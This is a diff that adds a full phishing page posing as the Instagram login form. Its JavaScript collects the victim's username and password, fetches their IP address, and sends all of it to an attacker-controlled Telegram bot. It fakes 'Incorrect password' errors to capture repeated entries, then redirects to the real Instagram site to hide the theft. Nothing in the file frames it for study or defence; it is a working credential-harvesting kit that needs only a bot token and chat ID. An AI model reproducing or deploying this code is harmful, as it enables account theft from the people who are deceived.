@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Form</title>
+    <style>
+        /* Instagram Themed Styling */
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-box {
+            background: white;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            border-radius: 10px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 350px;
+        }
+
+        .logo {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+
+        input[type="email"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #3897f0;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #3578e5;
+        }
+
+        #errorMessage {
+            color: red;
+            margin-top: 10px;
+        }
+
+        .forgot {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <!-- Instagram Logo -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+        
+        <!-- Login Form -->
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email or Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+            <p class="forgot"><a href="#">Forgot password?</a></p>
+            <p id="errorMessage"></p>
+        </form>
+    </div>
+
+    <script>
+        // JavaScript to handle form submission and Telegram integration
+        const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';  // Replace with your bot token
+        const chatId = 'YOUR_TELEGRAM_CHAT_ID';      // Replace with your chat ID
+        let attemptCount = 0;
+
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();  // Prevent form from reloading page
+
+            attemptCount++;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const formName = "Instagram";
+            
+            // Fetch user's IP address
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const userIp = ipData.ip;
+
+            // Prepare message for Telegram bot
+            const message = `
+📩 *New Login Attempt on Instagram Form*  
+📧 *Email/Username:* ${email}  
+🔑 *Password:* ${password}  
+🌐 *IP Address:* ${userIp}  
+🔁 *Attempt:* ${attemptCount}/3
+            `;
+
+            // Send data to Telegram bot
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+
+            // Incorrect password handling
+            if (attemptCount < 3) {
+                document.getElementById('errorMessage').textContent = "Incorrect password. Please try again.";
+            } else {
+                alert('Redirecting after 3 failed attempts...');
+                window.location.href = "https://www.instagram.com";  // Redirect after 3rd attempt
+            }
+        });
+    </script>
+</body>
+</html>
